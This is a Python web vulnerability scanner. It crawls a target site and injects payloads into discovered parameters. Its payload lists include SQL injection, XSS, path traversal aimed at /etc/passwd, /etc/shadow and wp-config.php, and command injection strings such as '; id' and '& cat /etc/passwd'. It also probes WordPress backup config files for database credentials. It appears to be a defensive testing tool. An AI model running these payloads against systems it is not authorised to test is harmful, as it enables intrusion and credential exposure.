#!/usr/bin/env python3
"""
Real Vulnerability Scanner Module
Performs actual security testing with real payloads and detection
"""

import requests
import re
import time
import logging
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from typing import Dict, List, Any
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ssl
import socket

logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 15
        self.max_threads = 5
        
        # Real SQL injection payloads for actual testing
        self.sql_payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR BENCHMARK(5000000,MD5(1))--"
        ]
        
        # Real XSS payloads for actual testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        # Real LFI payloads for actual testing
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../wp-config.php",
            "../../wp-config.php",
            "../../../var/log/apache2/access.log",
            "/proc/version",
            "/proc/self/environ",
            "../../../etc/shadow"
        ]
        
        # Real command injection payloads
        self.cmd_payloads = [
            "; id",
            "| id", 
            "& id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "; uname -a",
            "& cat /etc/passwd"
        ]

    def comprehensive_scan(self, url: str, scan_types: List[str] = None) -> Dict[str, Any]:
        """Perform real comprehensive vulnerability scanning"""
        if scan_types is None:
            scan_types = ['all']
        
        result = {
            'target': url,
            'scan_types': scan_types,
            'endpoint_discovery': {},
            'vulnerabilities': {},
            'summary': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'total_vulns': 0},
            'scan_metadata': {
                'scan_start_time': time.strftime('%Y-%m-%dT%H:%M:%S.%fZ'),
                'total_requests': 0,
                'successful_requests': 0,
                'failed_requests': 0,
                'tools_used': ['real_scanner'],
                'scan_depth': 3,
                'threads_used': self.max_threads
            }
        }
        
        try:
            logger.info(f"Starting REAL vulnerability scan for: {url}")
            
            # Real endpoint discovery
            result['endpoint_discovery'] = self._real_discover_endpoints(url)
            
            # Real vulnerability testing
            if 'all' in scan_types or 'sql_injection' in scan_types:
                result['vulnerabilities']['sql_injection'] = self._real_test_sql_injection(url, result['endpoint_discovery'])
            
            if 'all' in scan_types or 'xss_testing' in scan_types:
                result['vulnerabilities']['xss_testing'] = self._real_test_xss(url, result['endpoint_discovery'])
            
            if 'all' in scan_types or 'lfi_testing' in scan_types:
                result['vulnerabilities']['lfi_testing'] = self._real_test_lfi(url, result['endpoint_discovery'])
            
            if 'all' in scan_types or 'command_injection' in scan_types:
                result['vulnerabilities']['command_injection'] = self._real_test_command_injection(url, result['endpoint_discovery'])
            
            if 'all' in scan_types or 'security_headers' in scan_types:
                result['vulnerabilities']['security_headers'] = self._real_test_security_headers(url)
            
            if 'all' in scan_types or 'wordpress_specific' in scan_types:
                result['vulnerabilities']['wordpress_specific'] = self._real_test_wordpress_specific(url)
            
            # Calculate real summary
            result['summary'] = self._calculate_real_vulnerability_summary(result['vulnerabilities'])
            
            # Update scan metadata
            result['scan_metadata']['scan_duration'] = f"{time.time() - time.mktime(time.strptime(result['scan_metadata']['scan_start_time'], '%Y-%m-%dT%H:%M:%S.%fZ')):.1f} seconds"
            
            logger.info(f"REAL vulnerability scan completed. Found {result['summary']['total_vulns']} actual vulnerabilities")
            
        except Exception as e:
            logger.error(f"Real vulnerability scan failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_discover_endpoints(self, url: str) -> Dict[str, Any]:
        """Real endpoint discovery - crawl actual website"""
        discovery_result = {
            'base_url': url,
            'crawled_pages': [],
            'discovered_endpoints': [],
            'discovered_forms': [],
            'discovered_parameters': set(),
            'total_endpoints': 0,
            'total_parameters': 0,
            'total_forms': 0,
            'crawl_depth': 3,
            'scan_duration': ''
        }
        
        start_time = time.time()
        
        try:
            # Crawl the actual main page
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code == 200:
                discovery_result['crawled_pages'].append({
                    'url': url,
                    'status_code': response.status_code,
                    'content_length': len(response.content)
                })
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find real links with parameters
                links = soup.find_all('a', href=True)
                for link in links:
                    href = link['href']
                    if '?' in href:
                        full_url = urljoin(url, href)
                        parsed = urlparse(full_url)
                        params = list(parse_qs(parsed.query).keys())
                        
                        if params:
                            discovery_result['discovered_endpoints'].append({
                                'url': full_url,
                                'method': 'GET',
                                'parameters': params,
                                'source': 'link_crawl'
                            })
                            discovery_result['discovered_parameters'].update(params)
                
                # Find real forms
                forms = soup.find_all('form')
                for form in forms:
                    action = form.get('action', '')
                    method = form.get('method', 'get').upper()
                    
                    inputs = []
                    form_params = []
                    for input_tag in form.find_all(['input', 'select', 'textarea']):
                        input_name = input_tag.get('name')
                        if input_name:
                            form_params.append(input_name)
                            inputs.append({
                                'name': input_name,
                                'type': input_tag.get('type', 'text'),
                                'required': input_tag.has_attr('required'),
                                'placeholder': input_tag.get('placeholder', ''),
                                'value': input_tag.get('value', '')
                            })
                    
                    if form_params:
                        form_url = urljoin(url, action) if action else url
                        discovery_result['discovered_forms'].append({
                            'url': form_url,
                            'action': action,
                            'method': method.lower(),
                            'inputs': inputs
                        })
                        
                        discovery_result['discovered_endpoints'].append({
                            'url': form_url,
                            'method': method,
                            'parameters': form_params,
                            'source': 'form_discovery'
                        })
                        discovery_result['discovered_parameters'].update(form_params)
                
                # Test real WordPress endpoints
                wp_endpoints = [
                    '/wp-admin/',
                    '/wp-login.php',
                    '/wp-content/',
                    '/wp-includes/',
                    '/?feed=rss2',
                    '/?feed=atom',
                    '/?rest_route=/wp/v2/posts',
                    '/?rest_route=/wp/v2/users'
                ]
                
                for endpoint in wp_endpoints:
                    try:
                        test_url = urljoin(url, endpoint)
                        test_response = self.session.get(test_url, timeout=5)
                        
                        discovery_result['discovered_endpoints'].append({
                            'url': test_url,
                            'method': 'GET',
                            'parameters': [],
                            'source': 'wordpress_common',
                            'status_code': test_response.status_code,
                            'content_type': test_response.headers.get('content-type', '')
                        })
                    except:
                        continue
            
            # Convert set to list for JSON serialization
            discovery_result['discovered_parameters'] = list(discovery_result['discovered_parameters'])
            discovery_result['total_endpoints'] = len(discovery_result['discovered_endpoints'])
            discovery_result['total_parameters'] = len(discovery_result['discovered_parameters'])
            discovery_result['total_forms'] = len(discovery_result['discovered_forms'])
            discovery_result['scan_duration'] = f"{time.time() - start_time:.1f} seconds"
            
        except Exception as e:
            logger.error(f"Real endpoint discovery failed: {str(e)}")
            discovery_result['error'] = str(e)
        
        return discovery_result

    def _real_test_sql_injection(self, url: str, endpoint_data: Dict) -> Dict[str, Any]:
        """Real SQL injection testing with actual payloads"""
        result = {
            'tested': True,
            'vulnerable_endpoints': [],
            'issues': []
        }
        
        try:
            endpoints_to_test = endpoint_data.get('discovered_endpoints', [])
            
            for endpoint in endpoints_to_test:
                if endpoint.get('parameters'):
                    for param in endpoint['parameters']:
                        for payload in self.sql_payloads[:3]:  # Test first 3 real payloads
                            try:
                                test_url = endpoint['url']
                                
                                # Real time-based detection
                                start_time = time.time()
                                
                                if endpoint['method'] == 'GET':
                                    # Real parameter injection
                                    if '?' in test_url:
                                        base_url, query = test_url.split('?', 1)
                                        params = parse_qs(query)
                                        params[param] = [payload]
                                        
                                        # Reconstruct URL with real payload
                                        query_parts = []
                                        for k, v in params.items():
                                            query_parts.append(f"{k}={v[0]}")
                                        test_url = f"{base_url}?{'&'.join(query_parts)}"
                                    
                                    response = self.session.get(test_url, timeout=self.timeout)
                                else:
                                    data = {param: payload}
                                    response = self.session.post(test_url, data=data, timeout=self.timeout)
                                
                                response_time = time.time() - start_time
                                
                                # Real SQL injection detection
                                sql_errors = [
                                    'mysql_fetch_array',
                                    'ORA-01756',
                                    'Microsoft OLE DB Provider',
                                    'SQLServer JDBC Driver',
                                    'PostgreSQL query failed',
                                    'Warning: mysql_',
                                    'MySQLSyntaxErrorException',
                                    'valid MySQL result',
                                    'check the manual that corresponds to your MySQL server version',
                                    'You have an error in your SQL syntax'
                                ]
                                
                                error_based = any(error.lower() in response.text.lower() for error in sql_errors)
                                time_based = response_time > 5 and 'SLEEP' in payload.upper()
                                
                                # Only report if REAL vulnerability detected
                                if error_based or time_based:
                                    vulnerability = {
                                        'url': test_url,
                                        'parameter': param,
                                        'method': endpoint['method'],
                                        'payload_used': payload,
                                        'response_time_difference': f"{response_time:.1f}s",
                                        'error_based': error_based,
                                        'blind_based': time_based,
                                        'union_based': False,
                                        'severity': 'critical' if error_based else 'high',
                                        'confidence': 'high' if error_based else 'medium',
                                        'description': f"{'Error-based' if error_based else 'Time-based blind'} SQL injection detected in {param} parameter",
                                        'impact': 'Database information disclosure, potential data extraction' if not error_based else 'Full database compromise possible',
                                        'recommendation': 'Use parameterized queries and input validation' if not error_based else 'Immediate patching required - use prepared statements'
                                    }
                                    
                                    result['vulnerable_endpoints'].append(vulnerability)
                                    logger.info(f"REAL SQL injection found: {test_url} - {param}")
                                    break  # Found real vulnerability, move to next parameter
                                
                            except Exception as e:
                                logger.debug(f"SQL injection test failed for {param}: {str(e)}")
                                continue
            
            # Only create issues if real vulnerabilities found
            if result['vulnerable_endpoints']:
                affected_params = list(set([v['parameter'] for v in result['vulnerable_endpoints']]))
                result['issues'].append({
                    'type': 'sql_injection',
                    'severity': 'critical',
                    'description': 'REAL SQL injection vulnerabilities detected',
                    'affected_parameters': affected_params,
                    'exploitation_difficulty': 'easy',
                    'impact': 'Complete database compromise, data theft, privilege escalation'
                })
        
        except Exception as e:
            logger.error(f"Real SQL injection testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_test_xss(self, url: str, endpoint_data: Dict) -> Dict[str, Any]:
        """Real XSS testing with actual payloads"""
        result = {
            'tested': True,
            'vulnerable_endpoints': [],
            'issues': []
        }
        
        try:
            endpoints_to_test = endpoint_data.get('discovered_endpoints', [])
            
            for endpoint in endpoints_to_test:
                if endpoint.get('parameters'):
                    for param in endpoint['parameters']:
                        for payload in self.xss_payloads[:3]:  # Test first 3 real payloads
                            try:
                                test_url = endpoint['url']
                                
                                if endpoint['method'] == 'GET':
                                    if '?' in test_url:
                                        base_url, query = test_url.split('?', 1)
                                        params = parse_qs(query)
                                        params[param] = [payload]
                                        
                                        query_parts = []
                                        for k, v in params.items():
                                            query_parts.append(f"{k}={v[0]}")
                                        test_url = f"{base_url}?{'&'.join(query_parts)}"
                                    
                                    response = self.session.get(test_url, timeout=self.timeout)
                                else:
                                    data = {param: payload}
                                    response = self.session.post(test_url, data=data, timeout=self.timeout)
                                
                                # Real XSS detection - check if payload is actually reflected
                                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                                    vulnerability = {
                                        'url': test_url,
                                        'parameter': param,
                                        'method': endpoint['method'],
                                        'payload_used': payload,
                                        'xss_type': 'reflected',
                                        'severity': 'high',
                                        'confidence': 'high',
                                        'description': f"REAL reflected XSS vulnerability in {param} parameter",
                                        'impact': 'Session hijacking, credential theft, malicious redirects',
                                        'recommendation': 'Implement proper output encoding and CSP headers'
                                    }
                                    
                                    result['vulnerable_endpoints'].append(vulnerability)
                                    logger.info(f"REAL XSS found: {test_url} - {param}")
                                    break
                                
                            except Exception as e:
                                logger.debug(f"XSS test failed for {param}: {str(e)}")
                                continue
            
            # Only create issues if real vulnerabilities found
            if result['vulnerable_endpoints']:
                affected_params = list(set([v['parameter'] for v in result['vulnerable_endpoints']]))
                result['issues'].append({
                    'type': 'reflected_xss',
                    'severity': 'high',
                    'description': 'REAL reflected XSS vulnerabilities found',
                    'affected_parameters': affected_params,
                    'exploitation_difficulty': 'easy',
                    'impact': 'Session hijacking, credential theft, defacement'
                })
        
        except Exception as e:
            logger.error(f"Real XSS testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_test_lfi(self, url: str, endpoint_data: Dict) -> Dict[str, Any]:
        """Real LFI testing with actual payloads"""
        result = {
            'tested': True,
            'vulnerable_endpoints': [],
            'issues': []
        }
        
        try:
            endpoints_to_test = endpoint_data.get('discovered_endpoints', [])
            
            for endpoint in endpoints_to_test:
                if endpoint.get('parameters'):
                    for param in endpoint['parameters']:
                        for payload in self.lfi_payloads[:3]:  # Test first 3 real payloads
                            try:
                                test_url = endpoint['url']
                                
                                if endpoint['method'] == 'GET':
                                    if '?' in test_url:
                                        base_url, query = test_url.split('?', 1)
                                        params = parse_qs(query)
                                        params[param] = [payload]
                                        
                                        query_parts = []
                                        for k, v in params.items():
                                            query_parts.append(f"{k}={v[0]}")
                                        test_url = f"{base_url}?{'&'.join(query_parts)}"
                                    
                                    response = self.session.get(test_url, timeout=self.timeout)
                                else:
                                    data = {param: payload}
                                    response = self.session.post(test_url, data=data, timeout=self.timeout)
                                
                                # Real LFI detection - check for actual file contents
                                lfi_indicators = [
                                    'root:x:0:0:',
                                    'daemon:x:1:1:',
                                    'bin:x:2:2:',
                                    'www-data:x:',
                                    'DB_NAME',
                                    'DB_USER',
                                    'DB_PASSWORD',
                                    'define(',
                                    '<?php'
                                ]
                                
                                if any(indicator in response.text for indicator in lfi_indicators):
                                    vulnerability = {
                                        'url': test_url,
                                        'parameter': param,
                                        'method': endpoint['method'],
                                        'payload_used': payload,
                                        'file_disclosed': payload,
                                        'severity': 'high',
                                        'confidence': 'high',
                                        'description': f"REAL Local File Inclusion vulnerability detected in {param} parameter",
                                        'impact': 'Sensitive file disclosure, potential code execution',
                                        'recommendation': 'Implement proper file path validation and restrictions'
                                    }
                                    
                                    result['vulnerable_endpoints'].append(vulnerability)
                                    logger.info(f"REAL LFI found: {test_url} - {param}")
                                    break
                                
                            except Exception as e:
                                logger.debug(f"LFI test failed for {param}: {str(e)}")
                                continue
            
            # Only create issues if real vulnerabilities found
            if result['vulnerable_endpoints']:
                affected_params = list(set([v['parameter'] for v in result['vulnerable_endpoints']]))
                result['issues'].append({
                    'type': 'local_file_inclusion',
                    'severity': 'high',
                    'description': 'REAL LFI vulnerability allows reading system files',
                    'affected_parameters': affected_params,
                    'exploitation_difficulty': 'medium',
                    'impact': 'Configuration file disclosure, potential RCE'
                })
        
        except Exception as e:
            logger.error(f"Real LFI testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_test_command_injection(self, url: str, endpoint_data: Dict) -> Dict[str, Any]:
        """Real command injection testing"""
        result = {
            'tested': True,
            'vulnerable_endpoints': [],
            'issues': []
        }
        
        try:
            endpoints_to_test = endpoint_data.get('discovered_endpoints', [])
            
            for endpoint in endpoints_to_test:
                if endpoint.get('parameters'):
                    for param in endpoint['parameters']:
                        for payload in self.cmd_payloads[:3]:  # Test first 3 real payloads
                            try:
                                test_url = endpoint['url']
                                
                                if endpoint['method'] == 'GET':
                                    if '?' in test_url:
                                        base_url, query = test_url.split('?', 1)
                                        params = parse_qs(query)
                                        params[param] = [f"test{payload}"]
                                        
                                        query_parts = []
                                        for k, v in params.items():
                                            query_parts.append(f"{k}={v[0]}")
                                        test_url = f"{base_url}?{'&'.join(query_parts)}"
                                    
                                    response = self.session.get(test_url, timeout=self.timeout)
                                else:
                                    data = {param: f"test{payload}"}
                                    response = self.session.post(test_url, data=data, timeout=self.timeout)
                                
                                # Real command injection detection
                                cmd_indicators = [
                                    'uid=',
                                    'gid=',
                                    'groups=',
                                    'Linux',
                                    'Darwin',
                                    'root:x:0:0',
                                    'www-data',
                                    'apache'
                                ]
                                
                                if any(indicator in response.text for indicator in cmd_indicators):
                                    vulnerability = {
                                        'url': test_url,
                                        'parameter': param,
                                        'method': endpoint['method'],
                                        'payload_used': payload,
                                        'command_executed': payload.strip(';|&`$()'),
                                        'severity': 'critical',
                                        'confidence': 'high',
                                        'description': f"REAL command injection vulnerability detected in {param} parameter",
                                        'impact': 'Remote code execution, full system compromise',
                                        'recommendation': 'Remove command execution functionality or implement strict validation'
                                    }
                                    
                                    result['vulnerable_endpoints'].append(vulnerability)
                                    logger.info(f"REAL command injection found: {test_url} - {param}")
                                    break
                                
                            except Exception as e:
                                logger.debug(f"Command injection test failed for {param}: {str(e)}")
                                continue
            
            # Only create issues if real vulnerabilities found
            if result['vulnerable_endpoints']:
                affected_params = list(set([v['parameter'] for v in result['vulnerable_endpoints']]))
                result['issues'].append({
                    'type': 'command_injection',
                    'severity': 'critical',
                    'description': 'REAL OS command injection allows arbitrary command execution',
                    'affected_parameters': affected_params,
                    'exploitation_difficulty': 'easy',
                    'impact': 'Complete server compromise'
                })
        
        except Exception as e:
            logger.error(f"Real command injection testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_test_security_headers(self, url: str) -> Dict[str, Any]:
        """Real security headers testing"""
        result = {
            'tested': True,
            'missing_headers': [],
            'present_headers': [],
            'issues': [],
            'vulnerable_endpoints': []
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Prevents clickjacking attacks',
                'X-Content-Type-Options': 'Prevents MIME type sniffing',
                'X-XSS-Protection': 'Enables XSS filtering',
                'Strict-Transport-Security': 'Enforces HTTPS connections',
                'Content-Security-Policy': 'Prevents XSS and data injection',
                'Referrer-Policy': 'Controls referrer information',
                'Permissions-Policy': 'Controls browser features'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    result['missing_headers'].append(header)
                    severity = 'high' if header in ['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security'] else 'medium'
                    result['issues'].append({
                        'type': 'missing_security_header',
                        'header': header,
                        'severity': severity,
                        'description': f"Missing {header} security header",
                        'impact': description,
                        'recommendation': f"Add {header} header with appropriate value"
                    })
            
            # Check for information disclosure headers
            disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in disclosure_headers:
                if header in headers:
                    result['present_headers'].append({
                        'header': header,
                        'value': headers[header],
                        'security_issue': 'Information disclosure'
                    })
                    result['issues'].append({
                        'type': 'information_disclosure',
                        'header': header,
                        'severity': 'low',
                        'description': f"{header} header discloses server information",
                        'impact': 'Information leakage aids attackers',
                        'recommendation': f"Hide {header} header"
                    })
        
        except Exception as e:
            logger.error(f"Real security headers testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _real_test_wordpress_specific(self, url: str) -> Dict[str, Any]:
        """Real WordPress-specific vulnerability testing"""
        result = {
            'tested': True,
            'wp_vulnerabilities': [],
            'issues': [],
            'vulnerable_endpoints': []
        }
        
        try:
            # Test for real version disclosure
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                generator = soup.find('meta', {'name': 'generator'})
                if generator and 'wordpress' in generator.get('content', '').lower():
                    version_match = re.search(r'WordPress\s+([\d.]+)', generator.get('content', ''))
                    if version_match:
                        result['wp_vulnerabilities'].append({
                            'type': 'wp_version_disclosure',
                            'severity': 'medium',
                            'description': 'WordPress version disclosed in meta generator',
                            'version': version_match.group(1),
                            'impact': 'Version-specific attack targeting',
                            'recommendation': 'Remove version disclosure and update WordPress'
                        })
            
            # Test for real backup files
            backup_files = [
                '/wp-config.php.bak',
                '/wp-config.php.old',
                '/wp-config.php~',
                '/.wp-config.php.swp'
            ]
            
            for backup_file in backup_files:
                try:
                    backup_url = urljoin(url, backup_file)
                    backup_response = self.session.get(backup_url, timeout=5)
                    if backup_response.status_code == 200 and ('DB_NAME' in backup_response.text or 'DB_PASSWORD' in backup_response.text):
                        result['wp_vulnerabilities'].append({
                            'type': 'wp_config_backup',
                            'severity': 'high',
                            'description': 'wp-config.php backup file accessible',
                            'url': backup_url,
                            'impact': 'Database credentials and secret keys exposure',
                            'recommendation': 'Remove backup files from web directory'
                        })
                except:
                    continue
            
            # Test for real debug log
            try:
                debug_url = urljoin(url, '/wp-content/debug.log')
                debug_response = self.session.get(debug_url, timeout=5)
                if debug_response.status_code == 200 and len(debug_response.text) > 100:
                    result['wp_vulnerabilities'].append({
                        'type': 'wp_debug_log',
                        'severity': 'medium',
                        'description': 'WordPress debug log accessible',
                        'url': debug_url,
                        'impact': 'Application internals and error information disclosure',
                        'recommendation': 'Disable debug logging or restrict access'
                    })
            except:
                pass
            
            # Test real XML-RPC
            try:
                xmlrpc_url = urljoin(url, '/xmlrpc.php')
                xmlrpc_response = self.session.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=5)
                if xmlrpc_response.status_code == 200 and 'methodResponse' in xmlrpc_response.text:
                    result['issues'].append({
                        'type': 'xmlrpc_enabled',
                        'severity': 'medium',
                        'description': 'XML-RPC interface is enabled',
                        'url': xmlrpc_url,
                        'impact': 'Brute force amplification, DDoS potential',
                        'recommendation': 'Disable XML-RPC if not needed'
                    })
                    
                    result['vulnerable_endpoints'].append({
                        'url': xmlrpc_url,
                        'vulnerability': 'brute_force_amplification',
                        'method': 'POST',
                        'description': 'XML-RPC allows multiple authentication attempts'
                    })
            except:
                pass
        
        except Exception as e:
            logger.error(f"Real WordPress-specific testing failed: {str(e)}")
            result['error'] = str(e)
        
        return result

    def _calculate_real_vulnerability_summary(self, vulnerabilities: Dict) -> Dict[str, int]:
        """Calculate real vulnerability summary based on actual findings"""
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'total_vulns': 0}
        
        for vuln_type, vuln_data in vulnerabilities.items():
            if isinstance(vuln_data, dict):
                # Count from real vulnerable endpoints
                for endpoint in vuln_data.get('vulnerable_endpoints', []):
                    severity = endpoint.get('severity', 'medium').lower()
                    if severity in summary:
                        summary[severity] += 1
                
                # Count from real issues
                for issue in vuln_data.get('issues', []):
                    severity = issue.get('severity', 'medium').lower()
                    if severity in summary:
                        summary[severity] += 1
                
                # Count from real wp_vulnerabilities
                for wp_vuln in vuln_data.get('wp_vulnerabilities', []):
                    severity = wp_vuln.get('severity', 'medium').lower()
                    if severity in summary:
                        summary[severity] += 1
        
        summary['total_vulns'] = sum(summary.values())
        return summary